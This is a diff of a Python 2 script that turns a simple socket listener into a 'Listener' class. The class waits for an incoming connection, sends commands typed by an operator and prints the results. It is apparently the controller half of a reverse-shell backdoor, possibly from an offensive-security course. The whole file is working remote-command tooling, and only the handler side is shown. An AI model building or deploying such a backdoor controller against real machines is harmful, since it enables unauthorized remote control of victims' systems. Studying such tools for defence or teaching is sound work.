@@ -6,19 +6,31 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-listener.bind(("127.0.0.1",2508))
-listener.listen(0)
-print "[+] Waiting for incoming connection"
-connection,address = listener.accept()
-print "[+] Got a connection from " + str(address)
-result = connection.recv(1024)
-print result
-while True:
-    cmd = raw_input(">> ")
-    if not cmd:
-        continue
-    connection.send(cmd)
-    result = connection.recv(1024)
-    print result
+class Listener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print "[+] Waiting for incoming connection"
+        self.connection, address = listener.accept()
+        print "[+] Got a connection from " + str(address)
+        result = self.connection.recv(1024)
+        print result
+
+    def exec_remote(self,cmd):
+        self.connection.send(cmd)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            cmd = raw_input(">> ")
+            if not cmd:
+                continue
+            result = self.exec_remote(cmd)
+            print result
+
+
+listener = Listener("127.0.0.1",2508)
+listener.run()
+
